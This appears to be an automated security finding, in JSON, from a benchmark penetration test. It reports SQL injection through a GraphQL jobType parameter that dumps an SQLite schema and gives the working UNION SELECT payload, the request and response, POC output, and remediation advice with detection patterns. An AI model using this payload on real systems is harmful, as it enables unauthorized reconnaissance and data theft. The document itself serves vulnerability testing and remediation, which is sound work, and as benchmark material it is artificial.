{
  "title": "Database Schema Disclosure via SQL Injection - Information Disclosure",
  "severity": "HIGH",
  "description": "The SQL injection vulnerability in the jobType parameter can be leveraged to extract database schema information. By using a UNION-based SQL injection query against SQLite's sqlite_master table, an attacker can retrieve the CREATE TABLE statements and learn the exact structure of the database.\n\nThe vulnerability exists because the jobType parameter in the GraphQL jobs query is directly concatenated into SQL queries without parameterization or proper input validation. By injecting SQL UNION SELECT statements targeting the sqlite_master system table, an attacker can extract:\n\n- Complete table names and definitions\n- Column names and data types\n- Primary key and constraint information\n- Full database schema structure\n\nThis information disclosure significantly aids in crafting more targeted attacks, including:\n1. Database enumeration to identify all tables\n2. Column analysis to understand data types and relationships\n3. Planning of more sophisticated SQL injection attacks\n4. Efficient data extraction queries based on schema knowledge\n5. Identifying sensitive tables for targeted exploitation",
  "impact": "HIGH - Information Disclosure allows attacker to:\n1. Learn the exact database schema structure - Complete table and column enumeration\n2. Identify all tables and columns in the database - Full data model exposure\n3. Understand data relationships and constraints - Schema mapping\n4. Plan more targeted SQL injection attacks - Reconnaissance for further exploitation\n5. Identify potentially sensitive tables for further exploitation - Risk prioritization\n6. Understand the data model to craft UNION SELECT queries more effectively - Attack optimization\n7. Build a complete map of the backend database for reconnaissance - Full system architecture exposure\n\nThis facilitates subsequent attacks including targeted data exfiltration, privilege escalation, and business logic manipulation.",
  "endpoint": "https://example.com/graphql/",
  "evidence": "PAYLOAD: jobType=\\\"' UNION SELECT 1,name,sql,sql FROM sqlite_master WHERE type='table' AND '1'='1\\\"\n\nRequest: POST /graphql/\nBody: {\\\"query\\\": \\\"{ jobs(jobType: \\\\\\\"' UNION SELECT 1,name,sql,sql FROM sqlite_master WHERE type='table' AND '1'='1\\\\\\\") { id name type description } }\\\"}\n\nResponse Status: 200 OK\nResponse Body:\n{\n  \\\"data\\\": {\n    \\\"jobs\\\": [\n      {\n        \\\"id\\\": 1,\n        \\\"name\\\": \\\"jobs\\\",\n        \\\"type\\\": \\\"CREATE TABLE jobs (\\\\n        id INTEGER PRIMARY KEY,\\\\n        name TEXT,\\\\n        type TEXT,\\\\n        description TEXT\\\\n    )\\\",\n        \\\"description\\\": \\\"CREATE TABLE jobs (\\\\n        id INTEGER PRIMARY KEY,\\\\n        name TEXT,\\\\n        type TEXT,\\\\n        description TEXT\\\\n    )\\\"\n      }\n    ]\n  }\n}\n\nThe response reveals the complete database schema structure for the jobs table including column definitions, data types, and primary key configuration. This query successfully bypasses application filtering and accesses the sqlite_master system table, proving the SQL injection vulnerability allows unrestricted schema access.\n\nPOC Execution Output:\n[+] ✓ SQL injection successful\n[+] ✓ sqlite_master table accessible\n[+] ✓ CREATE TABLE statements returned\n[+] Exploitation Impact:\n    1. Complete database schema enumeration possible\n    2. All table names disclosed\n    3. All column names and types revealed\n    4. Primary keys and constraints exposed\n    5. Full database structure map available to attacker",
  "pocPath": "pocs/poc_sqli_schema_disclosure_evidence_analysis.sh",
  "remediation": "1. **Fix the underlying SQL injection vulnerability** - Use parameterized queries/prepared statements with placeholders instead of string concatenation for all SQL operations involving user-supplied jobType parameter\n\n2. **Implement database-level access controls** - Restrict database user permissions to not allow access to system tables like sqlite_master. Use database role-based access control to limit the user account used by the application\n\n3. **Implement query logging and monitoring** - Log all database queries and monitor for attempts to access system information tables (sqlite_master, sqlite_schema, information_schema). Alert on suspicious pattern detection\n\n4. **Apply principle of least privilege** - The database user account should only have SELECT permissions on application tables, not system tables or metadata tables\n\n5. **Add input validation** - Implement strict whitelist validation for the jobType parameter, only allowing known, pre-defined values (e.g., enum validation)\n\n6. **Implement query complexity analysis** - Detect and reject overly complex queries, UNION statements from user input, or queries that attempt to access system tables\n\n7. **Use an ORM or query builder** - Utilize ORMs like SQLAlchemy that automatically handle parameterization and prevent SQL injection by design\n\n8. **Implement API-level rate limiting** - Apply rate limiting to GraphQL queries to detect reconnaissance activity and automated schema enumeration attempts\n\n9. **Web Application Firewall (WAF)** - Deploy WAF rules to detect and block common SQL injection patterns including UNION SELECT, sqlite_master access, and information_schema queries",
  "references": "OWASP A03:2021 - Injection, CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection'), CWE-200: Exposure of Sensitive Information to an Unauthorized Actor, CWE-1188: Insecure Default Initialization with Hard-Coded Network Resource Configuration Data",
  "toolCallDescription": "Document the database schema disclosure SQL injection finding with POC evidence",
  "timestamp": "2025-11-10T15:09:29.734Z",
  "sessionId": "benchmark-XBEN-038-24-mht9rpjz",
  "target": "./repo"
}